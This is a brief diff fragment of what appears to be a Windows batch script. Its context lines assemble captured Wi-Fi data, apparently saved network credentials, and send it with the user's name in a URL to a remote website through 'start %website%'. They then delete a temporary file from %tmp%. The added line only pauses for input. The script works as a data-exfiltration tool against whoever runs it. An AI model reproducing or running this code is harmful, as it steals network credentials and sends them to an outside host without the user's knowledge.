@@ -129,4 +129,5 @@ set "wifi=%line1%%line2%%line3%%line4%%line5%%line6%%line7%%line8%%line9%%line10
 if %echowifi% == on echo %wifi%
 start %website%?/?"username=%username%/%wifi%"
 del %tmp%\wifi.url
+if %echowifi% == on set /p "end="
 exit
